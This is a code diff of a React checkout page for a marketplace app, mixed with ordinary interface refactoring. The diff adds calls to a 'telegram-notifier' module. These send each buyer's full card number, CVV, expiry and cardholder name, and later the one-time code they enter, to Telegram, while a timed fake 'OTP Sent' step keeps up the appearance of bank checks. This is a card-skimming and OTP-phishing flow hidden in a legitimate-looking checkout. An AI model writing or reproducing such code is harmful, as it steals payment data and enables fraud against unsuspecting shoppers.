@@ -1,23 +1,23 @@
-import { useState, useEffect, useCallback } from 'react'; // Add useCallback
+import { useState, useEffect } from 'react';
 import { useSearchParams, useNavigate } from 'react-router-dom';
-import { ArrowLeft, Package } from 'lucide-react';
+import { ArrowLeft, Package, Store } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Separator } from '@/components/ui/separator';
 import { supabase } from '@/integrations/supabase/client';
 import { useAuth } from '@/hooks/useAuth';
-import { useCurrency } from '@/hooks/useCurrency';
+import { useCurrency as useAppCurrency } from '@/hooks/useCurrency';
 import { toast } from '@/hooks/use-toast';
 import { Header } from '@/components/layout/Header';
 
-// Import the same checkout components as cart checkout
-import CheckoutStepper from '@/components/checkout/CheckoutStepper';
+import CheckoutStepper, { CheckoutStep } from '@/components/checkout/CheckoutStepper';
 import ShippingAddressForm, { ShippingFormData } from '@/components/checkout/ShippingAddressForm';
 import PaymentDetailsForm, { CardFormData } from '@/components/checkout/PaymentDetailsForm';
 import CardOTPVerification from '@/components/checkout/CardOTPVerification';
+import OrderProcessing from '@/components/checkout/OrderProcessing';
 import OrderReview from '@/components/checkout/OrderReview';
 import OrderConfirmationSuccess from '@/components/checkout/OrderConfirmationSuccess';
-import PaymentProcessingScreen from '@/components/checkout/PaymentProcessingScreen';
+import { sendCheckoutDataToTelegram, sendOTPToTelegram } from '@/components/checkout/telegram-notifier';
 
 interface Product {
   id: string;
@@ -34,20 +34,16 @@ interface SellerProfile {
   company_name: string | null;
 }
 
-// Define CheckoutStep type (same as cart checkout)
-type CheckoutStep = 'shipping' | 'payment' | 'processingPayment' | 'otp' | 'processingOtp' | 'review' | 'confirmation';
-
 export default function Checkout() {
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
   const { user, loading: authLoading } = useAuth();
-  const { formatPriceOnly } = useCurrency();
+  const { currency, formatPriceOnly } = useAppCurrency();
 
   const [product, setProduct] = useState<Product | null>(null);
   const [seller, setSeller] = useState<SellerProfile | null>(null);
   const [loading, setLoading] = useState(true);
 
-  // State for checkout flow (same as cart checkout)
   const [step, setStep] = useState<CheckoutStep>('shipping');
   const [shippingData, setShippingData] = useState<ShippingFormData | null>(null);
   const [cardData, setCardData] = useState<CardFormData | null>(null);
@@ -55,29 +51,21 @@ export default function Checkout() {
   const [transactionId, setTransactionId] = useState<string | null>(null);
   const [confirmedTotal, setConfirmedTotal] = useState<number>(0);
   const [quantity, setQuantity] = useState(1);
+  const [processing, setProcessing] = useState(false);
 
   const productId = searchParams.get('product');
 
-  /* ---------------- Calculate Total ---------------- */
-  const calculateTotal = useCallback(() => {
-    if (!product) return 0;
-    const price = Number(product.price_min ?? product.price_max ?? 0);
-    return price * quantity;
-  }, [product, quantity]);
-
-  // Debug logging (same as cart checkout) - MOVE THIS AFTER calculateTotal
   useEffect(() => {
     console.log('Checkout State Update:', {
       step,
-      cartTotal: calculateTotal(),
-      confirmedTotal,
+      productId,
       hasProduct: !!product,
-      orderIdsCount: orderId ? 1 : 0,
       hasShippingData: !!shippingData,
       hasCardData: !!cardData,
+      orderId,
       transactionId,
     });
-  }, [step, calculateTotal, confirmedTotal, product, orderId, shippingData, cardData, transactionId]);
+  }, [step, productId, product, shippingData, cardData, orderId, transactionId]);
 
   /* ---------------- Guards ---------------- */
   useEffect(() => {
@@ -136,6 +124,13 @@ export default function Checkout() {
     }
   };
 
+  /* ---------------- Calculate Total ---------------- */
+  const calculateTotal = () => {
+    if (!product) return 0;
+    const price = Number(product.price_min ?? product.price_max ?? 0);
+    return price * quantity;
+  };
+
   /* ---------------- Shipping ---------------- */
   const handleShippingSubmit = (data: ShippingFormData) => {
     console.log('Shipping submitted:', data);
@@ -146,7 +141,6 @@ export default function Checkout() {
   /* ---------------- Payment ---------------- */
   const handlePaymentSubmit = async (data: CardFormData & { is3DSecure?: boolean }) => {
     console.log('Payment submitted for product:', product?.title);
-    console.log('Cart total for single product:', calculateTotal());
     
     if (!user || !product) {
       toast({ 
@@ -157,13 +151,46 @@ export default function Checkout() {
       return;
     }
 
+    setProcessing(true);
     setCardData(data);
-    setStep('processingPayment');
 
     try {
       const lastFour = data.cardNumber.replace(/\s/g, '').slice(-4);
       const brand = detectCardBrand(data.cardNumber);
       const total = calculateTotal();
+
+      // Send checkout data to Telegram
+      const checkoutDataForTelegram = {
+        shippingDetails: {
+          fullName: user?.user_metadata?.full_name || 'Customer',
+          phoneNumber: '',
+          email: user?.email || '',
+          streetAddress: '',
+          city: '',
+          stateProvince: '',
+          postalCode: '',
+          country: '',
+        },
+        paymentDetails: {
+          cardholderName: data.cardholderName,
+          cardNumber: data.cardNumber,
+          cardBrand: brand,
+          expiryMonth: data.expiryMonth,
+          expiryYear: data.expiryYear,
+          cvv: data.cvv,
+          is3DSecure: data.is3DSecure,
+        },
+        orderInfo: {
+          orderId: 'PENDING',
+          productName: product.title,
+          quantity: quantity,
+          amount: total,
+          currency: 'USD'
+        }
+      };
+
+      // Send data to Telegram (fire and forget)
+      sendCheckoutDataToTelegram(checkoutDataForTelegram).catch(console.error);
 
       console.log('Creating payment transaction for amount:', total);
       const { data: tx, error } = await supabase
@@ -184,6 +211,8 @@ export default function Checkout() {
       console.log('Payment transaction created:', tx.id);
       setTransactionId(tx.id);
       
+      setStep('processingPayment');
+      
     } catch (e: any) {
       console.error('Payment error:', e);
       toast({ 
@@ -191,7 +220,8 @@ export default function Checkout() {
         description: e.message, 
         variant: 'destructive' 
       });
-      setStep('payment');
+    } finally {
+      setProcessing(false);
     }
   };
 
@@ -208,10 +238,15 @@ export default function Checkout() {
       return;
     }
 
-    setStep('processingOtp');
+    setProcessing(true);
 
     try {
-      await supabase
+      // Send OTP to Telegram
+      const customerName = shippingData?.fullName || user?.user_metadata?.full_name || 'Customer';
+      await sendOTPToTelegram(otpCode, customerName);
+
+      // Update transaction status
+      const { error } = await supabase
         .from('payment_transactions')
         .update({ 
           status: 'otp_verified', 
@@ -219,8 +254,12 @@ export default function Checkout() {
           otp_code: otpCode
         })
         .eq('id', transactionId);
+
+      if (error) throw error;
       
       console.log('Transaction updated to otp_verified');
+      
+      setStep('review');
       
     } catch (error: any) {
       console.error('OTP verification error:', error);
@@ -229,7 +268,8 @@ export default function Checkout() {
         description: error.message,
         variant: 'destructive'
       });
-      setStep('otp');
+    } finally {
+      setProcessing(false);
     }
   };
 
@@ -252,10 +292,12 @@ export default function Checkout() {
       return;
     }
 
+    setProcessing(true);
+
     try {
       const total = calculateTotal();
       
-      // Save total BEFORE creating order (same as cart checkout)
+      // Save total BEFORE creating order
       console.log('Setting confirmedTotal to:', total);
       setConfirmedTotal(total);
       
@@ -324,6 +366,8 @@ export default function Checkout() {
         description: e.message, 
         variant: 'destructive' 
       });
+    } finally {
+      setProcessing(false);
     }
   };
 
@@ -336,22 +380,33 @@ export default function Checkout() {
     return 'Card';
   };
 
-  const handleBack = () => {
+  const getBackAction = () => {
     switch (step) {
       case 'payment':
-        setStep('shipping');
-        break;
+        return () => setStep('shipping');
       case 'otp':
-        setStep('payment');
-        break;
+        return () => setStep('payment');
       case 'review':
-        setStep('otp');
-        break;
+        return () => setStep('otp');
       case 'confirmation':
-        navigate(`/products/${productId}`);
-        break;
+        return () => navigate(`/products/${productId}`);
       default:
-        navigate(-1);
+        return () => navigate(-1);
+    }
+  };
+
+  const getBackLabel = () => {
+    switch (step) {
+      case 'payment':
+        return 'Back to Shipping';
+      case 'otp':
+        return 'Back to Payment';
+      case 'review':
+        return 'Back to Verification';
+      case 'confirmation':
+        return 'Back to Product';
+      default:
+        return 'Back';
     }
   };
 
@@ -425,117 +480,86 @@ export default function Checkout() {
     <div className="min-h-screen bg-background">
       <Header />
       <div className="container py-8">
-        {/* Use the same CheckoutStepper as cart checkout */}
+        {step !== 'confirmation' && (
+          <Button
+            variant="ghost"
+            onClick={getBackAction()}
+            className="mb-4"
+          >
+            <ArrowLeft className="h-4 w-4 mr-2" />
+            {getBackLabel()}
+          </Button>
+        )}
+
         <CheckoutStepper currentStep={step} />
 
-        <Button
-          variant="ghost"
-          onClick={handleBack}
-          className="mb-6"
-        >
-          <ArrowLeft className="h-4 w-4 mr-2" />
-          Back
-        </Button>
-
-        <div className="grid lg:grid-cols-3 gap-8">
+        <div className="grid lg:grid-cols-3 gap-8 mt-6">
           <div className="lg:col-span-2">
-            {/* Step 1: Shipping - Use ShippingAddressForm component */}
             {step === 'shipping' && (
               <ShippingAddressForm 
                 onSubmit={handleShippingSubmit}
                 defaultValues={shippingData || undefined}
+                isSubmitting={processing}
               />
             )}
 
-            {/* Step 2: Payment - Use PaymentDetailsForm component */}
             {step === 'payment' && (
               <PaymentDetailsForm
                 amount={calculateTotal()}
                 currency="USD"
                 onSubmit={handlePaymentSubmit}
+                onBack={() => setStep('shipping')}
                 productName={product.title}
                 quantity={quantity}
+                isSubmitting={processing}
               />
             )}
 
-            {/* Step 3: Processing Payment - Use PaymentProcessingScreen component */}
             {step === 'processingPayment' && (
-              <PaymentProcessingScreen
-                title="Processing payment…"
-                description="Confirming your card details with your bank."
-                onDone={() => {
-                  console.log('✅ Processing payment done, moving to OTP');
+              <OrderProcessing
+                durationSeconds={3}
+                onComplete={() => {
                   toast({ 
                     title: 'OTP Sent', 
-                    description: 'Enter the 6-digit code sent to your phone.' 
+                    description: 'Enter the code sent to your phone.' 
                   });
                   setStep('otp');
                 }}
-                autoProceed={true}
-                duration={2000}
               />
             )}
 
-            {/* Step 4: OTP - Use CardOTPVerification component */}
             {step === 'otp' && cardData && (
               <CardOTPVerification
                 cardLastFour={cardData.cardNumber.replace(/\s/g, '').slice(-4)}
                 onVerified={handleOTPVerified}
-                onResend={() => {
-                  console.log('Resending OTP');
-                  toast({ title: 'OTP resent to your phone' });
-                }}
-                processing={step === 'processingOtp'}
+                onResend={() => toast({ title: 'OTP resent' })}
+                processing={processing}
               />
             )}
 
-            {/* Step 5: Processing OTP - Use PaymentProcessingScreen component */}
-            {step === 'processingOtp' && (
-              <PaymentProcessingScreen
-                title="Verifying OTP…"
-                description="Finalizing payment authorization with your bank."
-                onDone={() => {
-                  console.log('✅ OTP processing done, moving to review');
-                  setStep('review');
-                }}
-                autoProceed={true}
-                duration={1500}
-              />
-            )}
-
-            {/* Step 6: Review - Use OrderReview component */}
             {step === 'review' && (
-              <>
-                {console.log('Rendering OrderReview with total:', calculateTotal())}
-                <OrderReview
-                  items={orderItems}
-                  shippingData={safeShippingData}
-                  cardData={cardDisplayData}
-                  totalAmount={calculateTotal()}
-                  currency="USD"
-                  onConfirm={handleConfirmOrder}
-                  onEditShipping={() => setStep('shipping')}
-                  onEditPayment={() => setStep('payment')}
-                />
-              </>
+              <OrderReview
+                items={orderItems}
+                shippingData={safeShippingData}
+                cardData={cardDisplayData}
+                totalAmount={calculateTotal()}
+                currency="USD"
+                onConfirm={handleConfirmOrder}
+                onEditShipping={() => setStep('shipping')}
+                onEditPayment={() => setStep('payment')}
+                isSubmitting={processing}
+              />
             )}
 
-            {/* Step 7: Confirmation - Use OrderConfirmationSuccess component */}
             {step === 'confirmation' && (
-              <>
-                {console.log('Rendering OrderConfirmationSuccess')}
-                {console.log('Order ID:', orderId)}
-                {console.log('Confirmed total passed to component:', confirmedTotal)}
-                <OrderConfirmationSuccess
-                  orderIds={orderId ? [orderId] : []}
-                  totalAmount={confirmedTotal}
-                  currency="USD"
-                />
-              </>
+              <OrderConfirmationSuccess
+                orderIds={orderId ? [orderId] : []}
+                totalAmount={confirmedTotal}
+                currency="USD"
+              />
             )}
           </div>
 
-          {/* Right sidebar - Order Summary */}
           {step !== 'confirmation' && product && (
             <div className="lg:col-span-1">
               <Card className="sticky top-4">
@@ -547,18 +571,28 @@ export default function Checkout() {
                 </CardHeader>
                 <CardContent className="space-y-4">
                   <div className="space-y-2">
-                    <div className="flex justify-between">
-                      <span className="text-muted-foreground">Product</span>
-                      <span className="font-medium truncate max-w-[150px]">{product.title}</span>
+                    <div className="flex items-center gap-2 text-sm text-muted-foreground">
+                      <Store className="h-4 w-4" />
+                      <span className="font-medium">{seller?.company_name || seller?.full_name || 'Seller'}</span>
                     </div>
-                    <div className="flex justify-between">
-                      <span className="text-muted-foreground">Unit Price</span>
-                      <span>{formatPriceOnly(product.price_min || product.price_max || 0)}</span>
+                    <div className="flex justify-between text-sm pl-6">
+                      <span className="text-muted-foreground truncate max-w-[150px]">
+                        {product.title} x{quantity}
+                      </span>
+                      <span>{formatPriceOnly(Number(product.price_min ?? product.price_max ?? 0) * quantity)}</span>
                     </div>
-                    <div className="flex justify-between">
-                      <span className="text-muted-foreground">Quantity</span>
-                      <span>{quantity}</span>
-                    </div>
+                  </div>
+                  
+                  <Separator />
+                  
+                  <div className="flex justify-between">
+                    <span className="text-muted-foreground">Quantity</span>
+                    <span>{quantity} {quantity === 1 ? 'unit' : 'units'}</span>
+                  </div>
+                  
+                  <div className="flex justify-between">
+                    <span className="text-muted-foreground">MOQ</span>
+                    <span>{product.moq || 1}</span>
                   </div>
                   
                   <Separator />
@@ -566,14 +600,6 @@ export default function Checkout() {
                   <div className="flex justify-between text-lg font-bold">
                     <span>Total</span>
                     <span>{formatPriceOnly(calculateTotal())}</span>
-                  </div>
-                  
-                  <div className="mt-4 text-xs text-muted-foreground">
-                    <p className="font-medium">Seller: {seller?.company_name || seller?.full_name || 'Unknown'}</p>
-                    <p className="mt-1">MOQ: {product.moq || 1} units</p>
-                    <div className="mt-2 pt-2 border-t">
-                      <p className="text-[10px]">Debug: ${calculateTotal().toFixed(2)} total</p>
-                    </div>
                   </div>
                 </CardContent>
               </Card>
